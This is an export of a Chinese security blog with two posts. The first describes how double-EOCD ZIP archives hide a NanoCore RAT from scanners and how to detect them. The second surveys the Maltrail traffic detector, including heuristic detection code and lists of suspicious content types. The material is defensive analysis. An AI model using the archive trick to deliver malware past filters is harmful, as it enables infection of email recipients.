    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>大多数通过邮件传播的恶意软件都是打包为 ZIP、RAR、7z 等方式进行传播的。近日，研究人员发现了一个新型的恶意文件压缩方式，即 Double Loaded Zip File 双加载 ZIP 文件。</p><p>就本例而言，他包含有两个 ZIP 文件结构（2 个 EOCD）。第一个 ZIP 结构中包含有一个无恶意的 PNG 格式的图像文件 order.jpg（不是扩展名显示的 jpeg 格式），order.jpg 实际上一个诱饵文件，用来隐藏另一个 ZIP 结构的内容。第二个 ZIP 结构中包含 SHIPPING_MX00034900_PL_INV_pdf.exe，其实是一个远程木马 NanoCore RAT。</p><p>很明显，攻击者想尝试使用这种 dual archive 的方式来绕过安全扫描。</p><h2 id="0x01-文件特征"><a href="#0x01-文件特征" class="headerlink" title="0x01 文件特征"></a>0x01 文件特征</h2><ol><li>ZIP 文件的文件大小明显大于其压缩前的内容；</li><li>ZIP 文件的压缩方式都为 0008（deflate）；</li><li>ZIP 文件中有两个 End of Central Directory (EOCD) 标志，这表明存在两个独立的 ZIP 结构；</li><li>ZIP 文件 EOCD 标志后的 “核心目录结构总数” 都为 0001。</li></ol><p><img src="/img/DoubleLoadedZIPFile%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95/6a0133f264aa62970b0240a4983f91200c-800wi.jpg" alt="ZIP_attachment"></p><h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02 利用条件"></a>0x02 利用条件</h2><p>只有在用户使用某些特定的压缩工具时才会成功，比如 PowerArchiver、WinRAR 和 7-Zip 的某些版本。</p><p>![The ZIP content as per the archiving tools](/img/Double Loaded ZIP File绕过手法/6a0133f264aa62970b0240a4e62353200b-700wi.jpg)</p><h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>正常情况下 ZIP 压缩文件<strong>有且只有</strong>一个 EOCD 标志，存在于整个压缩包的结尾。因此，可以根据 ZIP 文件中<strong>是否存在两个及两个以上的目录结束标志（EOCD，End of Central Directory）</strong>，来检测是否存在 Double Loaded Zip File。</p><blockquote><p>EOCD：504B0506</p></blockquote><h2 id="附录：ZIP-文件格式分析"><a href="#附录：ZIP-文件格式分析" class="headerlink" title="附录：ZIP 文件格式分析"></a>附录：ZIP 文件格式分析</h2><p>通常情况下，我们所用 ZIP 文件格式包含有三个部分：<strong>压缩源文件数据区、压缩源文件目录区、压缩源文件目录结束标志</strong>。当 ZIP 压缩的文件不止一个时，压缩源文件数据区将会有多组 **[文件头+文件数据+数据描述符]**，ZIP 对每个文件都进行了独立压缩，故每个压缩的文件都将对应一条记录。</p><p><img src="/img/DoubleLoadedZIPFile%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95/8754535-34c5342c1f4951b2.png"></p><h3 id="Local-file-header-文件头"><a href="#Local-file-header-文件头" class="headerlink" title="Local file header 文件头"></a>Local file header 文件头</h3><p>文件头主要用于表示此文件的开始，记录了此文件压缩的信息，具体字段的含义如下表。（注：偏移量为十进制）</p><table><thead><tr><th align="center">偏移量</th><th align="center">占用字节数</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">4</td><td align="center">文件头标识，固定值为0x04034b50</td></tr><tr><td align="center">4</td><td align="center">2</td><td align="center">解压文件所需的pkware最低版本</td></tr><tr><td align="center">6</td><td align="center">2</td><td align="center"><strong>Genera purpose bit flag 通用比特标志位</strong></td></tr><tr><td align="center">8</td><td align="center">2</td><td align="center"><strong>Compression method 压缩方式</strong></td></tr><tr><td align="center">10</td><td align="center">2</td><td align="center">文件最后修改时间</td></tr><tr><td align="center">12</td><td align="center">2</td><td align="center">文件最后修改日期</td></tr><tr><td align="center">14</td><td align="center">4</td><td align="center"><strong>crc32校验码</strong></td></tr><tr><td align="center">18</td><td align="center">4</td><td align="center">压缩后的大小</td></tr><tr><td align="center">22</td><td align="center">4</td><td align="center">未压缩的大小</td></tr><tr><td align="center">26</td><td align="center">4</td><td align="center">文件名长度</td></tr><tr><td align="center">28</td><td align="center">2</td><td align="center">扩展区长度</td></tr><tr><td align="center">30</td><td align="center">n</td><td align="center">文件名</td></tr><tr><td align="center">30+n</td><td align="center">m</td><td align="center">扩展区</td></tr></tbody></table><h3 id="Centra-directory-压缩源文件目录区"><a href="#Centra-directory-压缩源文件目录区" class="headerlink" title="Centra directory 压缩源文件目录区"></a>Centra directory 压缩源文件目录区</h3><p>核心目录主要是记录压缩文件的目录信息，每个压缩源文件数据区的记录对应此压缩源文件目录去的一条记录。</p><table><thead><tr><th align="center">偏移量</th><th align="center">占用字节数</th><th align="center">字段说明</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">4</td><td align="center">核心目录文件头标志，固定值为0x02014B50</td></tr><tr><td align="center">4</td><td align="center">2</td><td align="center">压缩所用的PKWare版本</td></tr><tr><td align="center">6</td><td align="center">2</td><td align="center">解压所需的PKWare最低版本</td></tr><tr><td align="center">8</td><td align="center">2</td><td align="center">Genera purpose bit flag 通用比特标志位</td></tr><tr><td align="center">10</td><td align="center">2</td><td align="center">Compression method 压缩方式</td></tr><tr><td align="center">12</td><td align="center">2</td><td align="center">文件最后修改时间</td></tr><tr><td align="center">14</td><td align="center">2</td><td align="center">文件最后修改日期</td></tr><tr><td align="center">16</td><td align="center">4</td><td align="center">CRC32校验码</td></tr><tr><td align="center">20</td><td align="center">4</td><td align="center">压缩后的大小</td></tr><tr><td align="center">24</td><td align="center">4</td><td align="center">未压缩的大小</td></tr><tr><td align="center">28</td><td align="center">2</td><td align="center">文件名长度</td></tr><tr><td align="center">30</td><td align="center">2</td><td align="center">扩展域长度</td></tr><tr><td align="center">32</td><td align="center">2</td><td align="center">文件注释长度</td></tr><tr><td align="center">34</td><td align="center">2</td><td align="center">文件开始位置的磁盘编号</td></tr><tr><td align="center">36</td><td align="center">2</td><td align="center">内部文件属性</td></tr><tr><td align="center">38</td><td align="center">4</td><td align="center">外部文件属性</td></tr><tr><td align="center">42</td><td align="center">4</td><td align="center">本地文件头的相对偏移</td></tr><tr><td align="center">46</td><td align="center">n</td><td align="center">目录文件名</td></tr><tr><td align="center">46+n</td><td align="center">m</td><td align="center">扩展域</td></tr><tr><td align="center">46+n+m</td><td align="center">k</td><td align="center">文件注释内容</td></tr></tbody></table><h3 id="End-of-Central-directory-recored-压缩源文件目录结束标志"><a href="#End-of-Central-directory-recored-压缩源文件目录结束标志" class="headerlink" title="End of Central directory recored 压缩源文件目录结束标志"></a>End of Central directory recored 压缩源文件目录结束标志</h3><p>目录结束标志用于标记压缩的目录数据的结束，每个压缩文件对应在此数据区有一记录。</p><table><thead><tr><th align="center">偏移量</th><th align="center">占用字节数</th><th align="center">字段说明</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">4</td><td align="center">核心目录结束标记，固定值0x06054B50</td></tr><tr><td align="center">4</td><td align="center">2</td><td align="center">当前目录结束标记</td></tr><tr><td align="center">6</td><td align="center">2</td><td align="center">核心目录开始位置的磁盘编号</td></tr><tr><td align="center">8</td><td align="center">2</td><td align="center">磁盘上所记录的核心目录数量</td></tr><tr><td align="center">10</td><td align="center">2</td><td align="center">核心目录结构总数</td></tr><tr><td align="center">12</td><td align="center">4</td><td align="center">核心目录的大小</td></tr><tr><td align="center">16</td><td align="center">4</td><td align="center">核心目录开始位置相对于archive开始位置的位移</td></tr><tr><td align="center">20</td><td align="center">2</td><td align="center">注释长度</td></tr><tr><td align="center">22</td><td align="center">n</td><td align="center">注释内容</td></tr></tbody></table><p><strong>参考文章：</strong><br><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/double-loaded-zip-file-delivers-nanocore/">Double Loaded Zip File Delivers Nanocore</a><br><a href="https://www.jianshu.com/p/2f9431b21003?tdsourcetag=s_pctim_aiomsg">有关 ZIP 压缩包的破解</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ZIP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Maltrail 恶意流量检测工具调研</title>
    <link href="/post/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/"/>
    <url>/post/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p><a href="https://github.com/stamparm/maltrail">Maltrail</a> - Malicious traffic detection system，一款轻量级的恶意流量检测系统。</p><h2 id="0x01-特性"><a href="#0x01-特性" class="headerlink" title="0x01 特性"></a>0x01 特性</h2><ul><li>使用多个开源黑名单 (alientvault, autoshun, badips, sblam etc.)</li><li>有大量静态特征可供识别 (domain names, URLs, IP addresses or User-Agent values)</li><li>可检测未知威胁的启发式机制</li><li>系统采用 <code>流量</code> –&gt; <code>传感器</code> &lt;–&gt; <code>服务器</code> &lt;–&gt; <code>客户端</code> 的架构方式：<ul><li>传感器（Sensor）：负责采集网络流量，更新恶意样本，并进行特征匹配。</li><li>服务端（Server）：提供 Web 界面以及收集网络中的恶意样本流量。</li><li>客户端（Client）：访问和检索恶意流量信息。</li></ul></li><li>Web 报告页面</li></ul><h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><p>OS：Kali Linux；</p><p>使用最小化安装，即 Sensor 和 Server 在同一台机器上；</p><p>1.安装依赖库，下载源码包</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">sudo apt-get install git python-pcapy<br>git clone https://github.com/stamparm/maltrail.git<br></code></pre></td></tr></table></figure><p>2.启动 Sensor</p><p>第一次启动 Sensor 会自动下载各个 IOC 库；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd maltrail<br>sudo python sensor.py<br></code></pre></td></tr></table></figure><p>3.启动 Server</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python server.py<br></code></pre></td></tr></table></figure><p>4.测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ping -c 1 136.161.101.53<br>cat /var/log/maltrail/$(date +&quot;%Y-%m-%d&quot;).log<br></code></pre></td></tr></table></figure><p>5.网页打开 <a href="http://127.0.0.1:8338/">http://127.0.0.1:8338</a> ，用户名：admin，密码：changeme!</p><h2 id="0x03-检测方式"><a href="#0x03-检测方式" class="headerlink" title="0x03 检测方式"></a>0x03 检测方式</h2><ol><li>网络流量实时嗅探分析（默认行为，指定网卡进行数据包捕获）</li><li>离线 pcap 文件分析（指定 “-i” 参数，调用 pcapy 解析 pcap 文件）</li></ol><h2 id="0x04-特征源"><a href="#0x04-特征源" class="headerlink" title="0x04 特征源"></a>0x04 特征源</h2><ul><li>IOC 列表（恶意/可疑）<ul><li>静态列表：从各种恶意软件报告、论文以及个人研究文档中获取的恶意样本（maltrail/trails/static/malware、maltrail/trails/static/suspicious）</li><li>实时订阅源：从各种开源黑样本网站上下载的恶意样本，定期更新（update.py、maltrail/trails/feeds）</li><li>用户自定义列表：可以按照指定格式扩展订阅源（maltrail/trails/custom）</li></ul></li><li>高级启发式机制，可以帮助发现未知的威胁。</li></ul><h2 id="0x05-核心模块"><a href="#0x05-核心模块" class="headerlink" title="0x05 核心模块"></a>0x05 核心模块</h2><ul><li>update.py：更新 trails 中的所有订阅源，并将结果保存到 /root/.maltrail/trails.csv，主要使用 <code>update_trails</code> 方法</li><li>httpd.py：HTTP 入侵检测模块</li><li>settings.py：控制 Sensor 的嗅探及检测行为</li><li>sensor.py：传感器主程序</li><li>server.py：服务端主程序</li><li>log.py：日志记录模块</li><li>trails 目录：存放所有与 IOC 有关的信息</li><li>html 目录：生成 Client Web 页面</li></ul><h2 id="0x06-实际应用"><a href="#0x06-实际应用" class="headerlink" title="0x06 实际应用"></a>0x06 实际应用</h2><h3 id="1-大规模扫描（Mass-Scan）"><a href="#1-大规模扫描（Mass-Scan）" class="headerlink" title="1.大规模扫描（Mass Scan）"></a>1.大规模扫描（Mass Scan）</h3><p>类似 Shodan 和 ZoomEye 这样的组织会扫描整个网络，并通过他们的搜索引擎（给其他潜在的攻击者）免费提供所有结果（Maltrail 也可以利用这些信息，去溯源攻击者）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f4c5136567530302e706e67.png" alt="Shodan"></p><h3 id="2-匿名-Tor-攻击（Anonymous-attackers）"><a href="#2-匿名-Tor-攻击（Anonymous-attackers）" class="headerlink" title="2.匿名 Tor 攻击（Anonymous attackers）"></a>2.匿名 Tor 攻击（Anonymous attackers）</h3><p>Maltrail 利用 Tor 出口节点的公共列表来发现隐藏在 Tor 匿名网络背后的潜在攻击者。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f6458463872324b2e706e67.png" alt="Tor attacker"></p><h3 id="3-服务攻击（Service-attackers）"><a href="#3-服务攻击（Service-attackers）" class="headerlink" title="3.服务攻击（Service attackers）"></a>3.服务攻击（Service attackers）</h3><p>检测黑域名、黑 IP对组织范围内特定服务的访问情况。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f4f6f32616443662e706e67.png" alt="RDP brute force"></p><h3 id="4-恶意软件（Malware）"><a href="#4-恶意软件（Malware）" class="headerlink" title="4.恶意软件（Malware）"></a>4.恶意软件（Malware）</h3><p>如果组织内部受感染的计算机试图连接已知的 C&amp;C 服务器，可以检出威胁并对识别出恶意软件家族（威胁信息）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f47424c5749536f2e706e67.png" alt="beebone malware"></p><h3 id="5-可疑域名（Suspicious-domain-lookups）"><a href="#5-可疑域名（Suspicious-domain-lookups）" class="headerlink" title="5.可疑域名（Suspicious domain lookups）"></a>5.可疑域名（Suspicious domain lookups）</h3><p>Maltrail 包含有已知经常参与可疑活动的 TLD 域的静态列表（特征匹配），和由恶意软件生成的 DGA 域名、Tor 域名（启发式检测机制）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f4a544764744a302e706e67.png" alt="DGA"></p><h3 id="6-可疑-IPinfo（Suspicious-ipinfo-requests）"><a href="#6-可疑-IPinfo（Suspicious-ipinfo-requests）" class="headerlink" title="6.可疑 IPinfo（Suspicious ipinfo requests）"></a>6.可疑 IPinfo（Suspicious ipinfo requests）</h3><p>由于许多恶意软件使用某种 ipinfo 服务（例如 <a href="http://ipinfo.io/">ipinfo.io</a>）来查找受害者的互联网 IP 地址，因此，应该对这类请求进行密切监视。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f36534d4e3061742e706e67.png" alt="ipinfo filter"></p><h3 id="7-可疑文件下载（Suspicious-direct-file-downloads）"><a href="#7-可疑文件下载（Suspicious-direct-file-downloads）" class="headerlink" title="7.可疑文件下载（Suspicious direct file downloads）"></a>7.可疑文件下载（Suspicious direct file downloads）</h3><p>跟踪所有可疑的文件下载（例如<code>.apk</code>, <code>.chm</code>, <code>.egg</code>, <code>.exe</code>, <code>.hta</code>, <code>.hwp</code>, <code>.ps1</code>, <code>.scr</code>, <code>.sct</code> 文件扩展名），这可能会引发大量误报，但最终可能有助于重建感染链（由于合法的服务提供商，通常使用加密的HTTPS执行此类下载）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f6a7235425331682e706e67.png" alt="Direct.exe download"></p><h3 id="8-可疑-HTTP-请求（Suspicious-HTTP-requests）"><a href="#8-可疑-HTTP-请求（Suspicious-HTTP-requests）" class="headerlink" title="8.可疑 HTTP 请求（Suspicious HTTP requests）"></a>8.可疑 HTTP 请求（Suspicious HTTP requests）</h3><p>可以检出来自外部 Web 应用程序安全扫描程序的可疑请求（如 SQL、XSS、LFI 等）和内部用户对未知 Web 站点的恶意请求（启发式检测机制）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f517a63614573472e706e67.png" alt="Vulnerability scan"></p><h3 id="9-端口扫描（Port-scanning）"><a href="#9-端口扫描（Port-scanning）" class="headerlink" title="9.端口扫描（Port scanning）"></a>9.端口扫描（Port scanning）</h3><p>如果多次的尝试连接大量的不同的 TCP 端口，Maltrail 将警告存在潜在的端口扫描行为（启发式检测机制），能够识别 nmap 等流行的扫描工具。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f5653374c3241332e706e67.png" alt="nmap scan"></p><h3 id="10-DNS-耗竭攻击（DNS-resource-exhaustion）"><a href="#10-DNS-耗竭攻击（DNS-resource-exhaustion）" class="headerlink" title="10.DNS 耗竭攻击（DNS resource exhaustion）"></a>10.DNS 耗竭攻击（DNS resource exhaustion）</h3><p>如果有大量的 DNS 递归查询（随机子域名），Maltrail 将警告存在潜在的DDoS攻击行为（启发式检测机制）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f52756a686e4b572e706e67.png" alt="DNS resource exhaustion"></p><h3 id="11-敏感信息泄露（Data-leakage）"><a href="#11-敏感信息泄露（Data-leakage）" class="headerlink" title="11.敏感信息泄露（Data leakage）"></a>11.敏感信息泄露（Data leakage）</h3><p>有些程序会表现出类似于恶意软件的行为，它们会将潜在的敏感数据发送到远程机器（尤其是基于移动设备的），Maltrail 会试图捕获这样的行为（启发式检测机制）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f367a74326758672e706e67.png" alt="Data leakage"></p><h3 id="12-误报处理（False-positives）"><a href="#12-误报处理（False-positives）" class="headerlink" title="12.误报处理（False positives）"></a>12.误报处理（False positives）</h3><p>与所有其他安全解决方案一样，Maltrail 容易出现”误报“，这时需要管理员投入一些额外的时间，并（以其他方式）检查“可疑 trail”是否确实存在恶意（通过实时关联其他开源情报）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f346353394e4a422e706e67.png" alt="Google false positive"></p><h2 id="0x07-关注点"><a href="#0x07-关注点" class="headerlink" title="0x07 关注点"></a>0x07 关注点</h2><ul><li><p>IOC 数据采集模块的提取和利用</p><ul><li>重点是对 IOC 的收集利用，要建立一套成熟的 OpenIOC 机制；</li><li>对搜集到的 IOC 要同时记录其关联的攻击类型、组织信息（而不是仅仅像 <a href="https://github.com/stamparm/ipsum">IPsum</a> 那样）。</li></ul></li><li><p>在 Web 平台显示恶意 IP 相关的 whois 信息及威胁信息</p><ul><li>可以手动添加/修改 whois 信息及威胁信息；</li><li>使用 <a href="https://www.shodan.io/">Shodan</a>、<a href="http://www.zoomeye.org/">ZoomEye</a>、<a href="https://duckduckgo.com/">DuckDuckGo</a>、<a href="http://www.ripe.net/">RIPE</a> 等网站提供的信息。</li></ul></li></ul><h2 id="附：Maltrail-heuristic-判定"><a href="#附：Maltrail-heuristic-判定" class="headerlink" title="附：Maltrail heuristic 判定"></a>附：Maltrail heuristic 判定</h2><p>1.域名有效长度超长（24个字符）- long domain (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts[<span class="hljs-number">0</span>]) &gt; SUSPICIOUS_DOMAIN_LENGTH_THRESHOLD <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> parts[<span class="hljs-number">0</span>]:<br></code></pre></td></tr></table></figure><p>2.SIP 每秒连接 DIP 次数过多（10次） - potential port scanning</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> sec &gt; connect_sec:<br>  <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> _connect_src_dst:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(_connect_src_dst[key]) &gt; PORT_SCANNING_THRESHOLD:<br>      _src_ip, _dst_ip = key.split(<span class="hljs-string">&#x27;~&#x27;</span>)<br>      <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_whitelisted(_src_ip):<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> _connect_src_details[key]:<br>          log_event((sec, usec, _src_ip, _[<span class="hljs-number">2</span>], _dst_ip, _[<span class="hljs-number">3</span>], PROTO.TCP, TRAIL.IP, _src_ip, <span class="hljs-string">&quot;potential port scanning&quot;</span>, <span class="hljs-string">&quot;(heuristic)&quot;</span>), packet)<br></code></pre></td></tr></table></figure><p>3.TCP 流量命中以下规则 - sinkhole response (malware)、seized domain (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> tcp_data.startswith(<span class="hljs-string">&quot;HTTP/&quot;</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(_ <span class="hljs-keyword">in</span> tcp_data[:tcp_data.find(<span class="hljs-string">&quot;\r\n\r\n&quot;</span>)] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;X-Sinkhole:&quot;</span>, <span class="hljs-string">&quot;X-Malware-Sinkhole:&quot;</span>, <span class="hljs-string">&quot;Server: You got served&quot;</span>, <span class="hljs-string">&quot;Server: Apache 1.0/SinkSoft&quot;</span>, <span class="hljs-string">&quot;sinkdns.org&quot;</span>)) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;\r\n\r\nsinkhole&quot;</span> <span class="hljs-keyword">in</span> tcp_data:<br>    log_event((sec, usec, src_ip, src_port, dst_ip, dst_port, PROTO.TCP, TRAIL.IP, src_ip, <span class="hljs-string">&quot;sinkhole response (malware)&quot;</span>, <span class="hljs-string">&quot;(heuristic)&quot;</span>), packet)<br>    <span class="hljs-keyword">else</span>:<br>      index = tcp_data.find(<span class="hljs-string">&quot;&lt;title&gt;&quot;</span>)<br>      <span class="hljs-keyword">if</span> index &gt;= <span class="hljs-number">0</span>:<br>        title = tcp_data[index + <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;&lt;title&gt;&quot;</span>):tcp_data.find(<span class="hljs-string">&quot;&lt;/title&gt;&quot;</span>, index)]<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(_ <span class="hljs-keyword">in</span> title.lower() <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;this domain&quot;</span>, <span class="hljs-string">&quot;has been seized&quot;</span>)):<br>          log_event((sec, usec, src_ip, src_port, dst_ip, dst_port, PROTO.TCP, TRAIL.IP, title, <span class="hljs-string">&quot;seized domain (suspicious)&quot;</span>, <span class="hljs-string">&quot;(heuristic)&quot;</span>), packet)     <br></code></pre></td></tr></table></figure><p>4.TCP “Content-Type” 中存在以下特征 - content type (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">SUSPICIOUS_CONTENT_TYPES = (<span class="hljs-string">&quot;application/vnd.ms-htmlhelp&quot;</span>, <span class="hljs-string">&quot;application/x-bsh&quot;</span>, <span class="hljs-string">&quot;application/x-chm&quot;</span>, <span class="hljs-string">&quot;application/x-sh&quot;</span>, <span class="hljs-string">&quot;application/x-shellscript&quot;</span>, <span class="hljs-string">&quot;application/hta&quot;</span>, <span class="hljs-string">&quot;text/x-scriptlet&quot;</span>, <span class="hljs-string">&quot;text/x-sh&quot;</span>, <span class="hljs-string">&quot;text/x-shellscript&quot;</span>)<br></code></pre></td></tr></table></figure><p>5.HTTP 流量中存在以下特征 - potential proxy probe (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> config.USE_HEURISTICS <span class="hljs-keyword">and</span> dst_port == <span class="hljs-number">80</span> <span class="hljs-keyword">and</span> path.startswith(<span class="hljs-string">&quot;http://&quot;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">any</span>(_ <span class="hljs-keyword">in</span> path <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> SUSPICIOUS_PROXY_PROBE_PRE_CONDITION) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> _check_domain_whitelisted(path.split(<span class="hljs-string">&#x27;/&#x27;</span>)[<span class="hljs-number">2</span>]):<br>  trail = re.sub(<span class="hljs-string">r&quot;(http://[^/]+/)(.+)&quot;</span>, <span class="hljs-string">r&quot;\g&lt;1&gt;(\g&lt;2&gt;)&quot;</span>, path)<br>  trail = re.sub(<span class="hljs-string">r&quot;(http://)([^/(]+)&quot;</span>, <span class="hljs-keyword">lambda</span> match: <span class="hljs-string">&quot;%s%s&quot;</span> % (match.group(<span class="hljs-number">1</span>), match.group(<span class="hljs-number">2</span>).split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>].rstrip(<span class="hljs-string">&#x27;.&#x27;</span>)), trail)<br><br>SUSPICIOUS_PROXY_PROBE_PRE_CONDITION = (<span class="hljs-string">&quot;probe&quot;</span>, <span class="hljs-string">&quot;proxy&quot;</span>, <span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-string">&quot;check&quot;</span>)<br></code></pre></td></tr></table></figure><p>6.HTTP 流量中存在 UA 字段且不在下列白名单中 - user agent (suspicious)</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">WHITELIST_UA_KEYWORDS = (<span class="hljs-string">&quot;AntiVir-NGUpd&quot;</span>, <span class="hljs-string">&quot;TMSPS&quot;</span>, <span class="hljs-string">&quot;AVGSETUP&quot;</span>, <span class="hljs-string">&quot;SDDS&quot;</span>, <span class="hljs-string">&quot;Sophos&quot;</span>, <span class="hljs-string">&quot;Symantec&quot;</span>, <span class="hljs-string">&quot;internal dummy connection&quot;</span>, <span class="hljs-string">&quot;Microsoft-CryptoAPI&quot;</span>)<br></code></pre></td></tr></table></figure><p>7.如果 HTTP 请求不在下列白名单且包含可疑预处理参数 - (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">WHITELIST_HTTP_REQUEST_PATHS = (<span class="hljs-string">&quot;fql&quot;</span>, <span class="hljs-string">&quot;yql&quot;</span>, <span class="hljs-string">&quot;ads&quot;</span>, <span class="hljs-string">&quot;../images/&quot;</span>, <span class="hljs-string">&quot;../themes/&quot;</span>, <span class="hljs-string">&quot;../design/&quot;</span>, <span class="hljs-string">&quot;../scripts/&quot;</span>, <span class="hljs-string">&quot;../assets/&quot;</span>, <span class="hljs-string">&quot;../core/&quot;</span>, <span class="hljs-string">&quot;../js/&quot;</span>, 